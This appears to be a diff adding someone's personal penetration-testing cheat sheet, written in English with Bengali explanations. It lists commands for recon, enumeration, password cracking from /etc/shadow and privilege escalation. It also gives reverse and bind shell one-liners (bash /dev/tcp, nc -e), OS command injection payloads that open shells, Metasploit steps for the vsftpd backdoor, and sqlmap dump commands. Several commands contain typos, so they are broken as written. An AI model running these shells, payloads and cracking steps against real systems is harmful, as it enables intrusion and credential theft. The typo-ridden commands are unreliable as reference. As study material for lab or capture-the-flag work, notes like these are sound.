@@ -1,0 +1,286 @@
+The phase of a hacking attack : Recon -> Scanning -> Gaining Access -> Maintain Access -> Clearing Tracks
+
+Most Important steps : Scanning -> Enum -> Gaining Access -> priv Escalation
+
+Common find Command:
+
+find / -type f -name bash.sh 2> /dev/null
+find / -type d -name "config" 2>/dev/null
+find / -type l 2>/dev/null
+find / -perm -4000 2>/dev/null
+find / -perm -2000 2>/dev/null
+find / -perm -1000 2>/dev/null
+find / -type f -size +100M 2>/dev/null
+find / -type f -size -1k 2>/dev/null
+find /home -type f -perm -o+w 2>/dev/null
+find /var/log -type f -mtime -1 2>/dev/null
+find / -atime +30 2>/dev/null
+find /tmp -type f -name "*.log" -delete 2>/dev/null
+find /etc -type f -exec grep -i "password" {} + 2>/dev/null
+find / -type f -executable 2>/dev/null
+find /path/to/search -name "filename.txt"
+find /path/to/search -iname "filename.txt"
+find /path/to/search -type f -name "*.log"
+find /path/to/search -type f -mtime -7
+find /path/to/search -type f -amin -60
+find /path/to/search -type f -mtime +30
+find / -type f -size +100M
+find / -type f -size -10k
+find / -type f -user username
+find / -type f -perm 0777
+find /path -type f -name "*.tmp" -mtime +7 -delete
+find /path -type f -empty -delete
+find /path -type d -empty -delete
+
+find /var/log -name "*.log" -exec ls -lh {} \;
+find /etc -name "*.conf" -exec tar -rvf conf_backup.tar {} +
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+find / -type f -mmin -60 2>/dev/null
+
+find / -type f -name hackerscript.sh 2> /dev/null
+find / -type f -name hackerscript 2> /dev/null
+find / -type f -name "hackerscript*" 2> /dev/null
+find / -type f -user eric 2> /dev/null | grep -v '^/sys' | grep -v '^/proc' | grep -v '^/run' | grep -v '.config'
+find / -type f -user eric 2> /dev/null | grep -v '^/sys' | grep -v '^/proc' | grep -v '^/run'
+
+dpkg -l
+dpkg -l | wc -l
+dpkg -l | grep -i squid
+
+pstree
+ps -ef
+
+Recon:
+
+nmap -sn 10.10.10.10
+nmap 10.10.10.10
+nmap 10.10.10.10 -p 22,80,4444
+nmap 10.10.10.10 -p-
+nmap 10.10.10.10
+nmap -sV 10.10.10.10 -p- -O
+nmap -sV 10.10.10.10 -p- -O -sC
+-A = -sV -O -sC
+nmap -A 10.10.10.10 -p- --script vuln
+
+ftp anonymous@10.10.10.10
+nc 10.10.10.10 21
+telnet 10.10.10 21
+
+ssh msfadmin@10.10.10.10
+nc 10.10.10.10 22
+nc 10.10.10.10 25
+
+Local Port Forwarding: ssh bob@ssh.gugulu.org -L 4444:www.example.com:80
+Remote Port Forwarding: ssh bob@ssh.gugulu.org -R 8080:127.0.0.1:1337
+Dynamic Port Forwarding: ssh bob@ssh.gugulu.org -D 9000 -N -f
+
+smbclient -L //192.168.1.10
+smbclient -N //192.168.1.10/projects
+smbclient -U admin //192.168.1.10/projects
+
+mmap -e 10.10.10.10
+showmount -e 192.168.1.10
+mount -t nfs 192.168.1.10:/home/ross /mnt/nfs
+mount -t nfs 192.168.1.10:/shared /tmp/nfs
+nmap -p 111 --script=nfs-showmount,nfs-ls,nfs-statfs 192.168.1.10
+
+nmap -sU -p 161 --script=snmp* <target_ip>
+nmap -sU -p 161 --script=snmp-info 192.168.1.10
+nmap -A 10.10.10.10
+nmap -p161 -A 10.10.10.10 -sU
+onesixtyone -c communities.txt 10.10.10.10 -d
+
+dig www.google.com 
+dig www.google.com AAAA
+dig www.google.com TXT
+dig www.google.com MX
+dig www.google.com NS
+dig www.google.com A
+dig -x 10.10.10.10
+
+nslookup example.com
+nslookup -query=mx example.com
+nslookup -query=ns example.com
+nslookup -query=any example.com
+nslookup 8.8.8.8
+
+curl http://10.10.10.10 
+curl http://10.10.10.10 -Iv
+curl http://10.10.10.10 -v -X POST
+
+Tools for directory : gobuster, dirb, dirbuster, wfuzz, fuff, dirsearch
+
+Cracking passwd:
+cp /etc/passwd passwd.txt
+cp /etc/shadow shadow.txt
+unshadow passwd.txt shadow.txt > john.txt
+john john.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --show john.txt
+
+🔁 ১. Reverse Shell (রিভার্স শেল)
+
+🧠 সংক্ষিপ্ত ধারণা: রিভার্স শেল হলো এমন একটি টেকনিক যেখানে টার্গেট মেশিন (ভিকটিম) নিজেই অ্যাটাকার মেশিনের সাথে সংযোগ স্থাপন করে, এবং তখন অ্যাটাকার সেই ভিকটিমের মেশিনে কমান্ড চালাতে পারে। ⚠️ এই শেল-এ অ্যাটাকার "লিসেনার" হিসেবে কাজ করে, আর ভিকটিম "ক্লায়েন্ট" হয়ে কানেক্ট করে।
+
+✅ উদাহরণ (Linux-based Reverse Shell):
+▶️ অ্যাটাকার মেশিন (⚔️ Kali Linux): এই মেশিনে আপনি listener চালাবেন, যাতে ভিকটিম কানেক্ট করতে পারে। :  nc -lvnp 4444
+▶️ Linux (Victim Machine-Reverse Shell পাঠান) : bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+✅ উদাহরণ: Attacker in Windows, Victim in Linux (Reverse Shell)
+🔧 Netcat Windows version: nc.exe -lvnp 4444
+🎯 Victim: Linux Command (in bash): bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+
+🔗 Bind shell মানে: ভিকটিম মেশিনে একটি port-এ শেল "bind" করা হয়, এবং অ্যাটাকার ঐ পোর্টে কানেক্ট করে শেল পায়।
+▶️ Victim (Linux) মেশিন : nc -lvnp 4444 -e /bin/bash
+▶️ Attacker মেশিন থেকে কানেক্ট করুন:  nc 10.10.10.10 4444
+
+Shell:
+ip a
+python3 -m http.server
+
+nc -nlvp 4444 [cmd]
+nc 10.10.10.10 4444 [linux]
+
+nc -nlvp 4444 > wget.exe [cmd]
+nc 10.10.10.10 4444 < wget.exe [linux]
+
+nc -nlvp 4444 -e /usr/bin/bash [linux]
+nc 10.10.10.10 4444 [cmd]
+
+nc -nvlp 4444 -e cmd.exe [cmd]
+nc 10.10.10.10 4444 [linux]
+
+nc 10.10.10.10 4444 -e cmd.exe [cmd]
+nc -nvlp 4444 [linux]
+
+Metasploit::::
+
+msfconsole
+ip addr sh
+sudo nmap -p- -A 10.10.10.10 --script vuln
+searh ftp
+search plartform:unix type:exploit ftp
+search vsftpd 2.3.4
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+options
+set rhosts 10.10.10.10
+options
+run
+
+whoami, ifconfig, uname -a, 
+
+nmap -A 10.10.10.10 --script buln -p 3632
+
+search distec
+use exploit/unix/misc/distec_exec
+options
+set rhosts 10.10.10.10
+options
+run
+show payloads
+set payload payload/cmd/unix/reverse_perl
+
+OS command injection:
+; nc 10.10.10.10 4444 -e /bin/bash
+10.10.10.10
+10.10.10.10;pwd
+
+Linux Prev:
+whoami
+ls -la
+ls -la .ssh
+less .ssh_history
+ls /home
+ls -la /tmp
+cat /etc/passwd
+cat /etc/passwd | grep -i "sh$"
+
+find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+find / -perm /4000 2>/dev/null
+find / -perm /2000 2>/dev/null
+
+https://gtfobins.github.io/
+
+ps aux
+uname -a
+cat /etc/os-release
+ss -tlpn
+mariadb -u root -p sommer
+
+Web Hacking:
+
+sqlmap -r req.txt --dbs
+sqlmap -r req.txt -D dbname -T tbname -C admin,pass --dump
+
+OS command injection:
+; nc 10.10.10.10 4444 -e /bin/bash
+10.10.10.10
+10.10.10.10;pwd
+
+; nc -nlvp 4444 -e /bin/bash  [in linux termnial : nc 10.10.10.10 4444]
+| nc 10.10.10.10 4444  -e /bin/bash  [in linux terminal : nc -nlvp 444]
+
+Connector >>>> : ; & && | ||
+
+API Hacking:
+
+https://example.com/bin/search.php?id=22&search=hacking
+
+HTTP Methods:
+GET - Demand resources from the server
+POST - Send data to the server
+OPTIONS - Ask for available Options
+PUT - Set Data on the server side
+PATCH - After data on the server side
+DELETE - Delelte data on the server side
+
+Restful API examples:
+
+# User Management
+https://www.abc.com/api/v1/register
+https://www.abc.com/api/v1/login
+https://www.abc.com/api/v1/users
+https://www.abc.com/api/v1/users/{id}
+
+# Product Management
+https://www.abc.com/api/v1/products
+https://www.abc.com/api/v1/products/{id}
+
+# Orders
+https://www.abc.com/api/v1/orders
+https://www.abc.com/api/v1/orders/{id}
+
+# Authentication
+https://www.abc.com/api/v1/auth/login
+https://www.abc.com/api/v1/auth/refresh
+https://www.abc.com/api/v1/auth/logout
+
+# Admin / Debug (potential bug bounty targets)
+https://www.abc.com/api/v1/admin/config
+https://www.abc.com/api/v1/admin/logs
+https://www.abc.com/api/v1/debug/routes
+https://www.abc.com/api/v1/metrics
+
+CRUD : Create, Read, Update, Delete [POST, GET, PUT/PATCH, DELETE]
+
+Standard API Types:
+RPC - Remote Procedure Call
+REST - Representational State Transfer
+SOAP - Simple Object Access Protocol
+GraphQL - Graph Query Language
+
+
+
+
+
+
+
+
+
+
+
+
+
